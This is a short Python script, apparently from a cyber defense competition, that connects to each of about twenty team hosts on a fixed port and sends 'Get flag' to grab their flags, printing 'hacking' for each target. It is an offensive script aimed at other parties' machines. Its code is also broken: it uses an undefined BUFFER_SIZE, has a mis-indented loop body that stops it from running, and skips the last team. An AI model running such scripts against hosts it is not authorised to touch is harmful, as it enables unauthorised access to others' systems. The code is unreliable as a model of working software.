#!/usr/bin/python

import socket

numTeams = 20
TCP_PORT = 1339

def tryDBAccess(machineName):
    buffer = "Get flag\n"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((machineName, TCP_PORT))
    s.send(buffer)
    data = s.recv(BUFFER_SIZE)
    s.close()

    print "received data:", data



def hackTheDBs():
    for n in range(1,numTeams):
        machineName = "traffic.team" + str(n) + ".isucdc.com"
            print("hacking " + machineName)
            tryDBAccess(machineName)

def main():
    print("Running 2020 dbhack script\n")
    hackTheDBs()


if __name__ == '__main__':
    main()
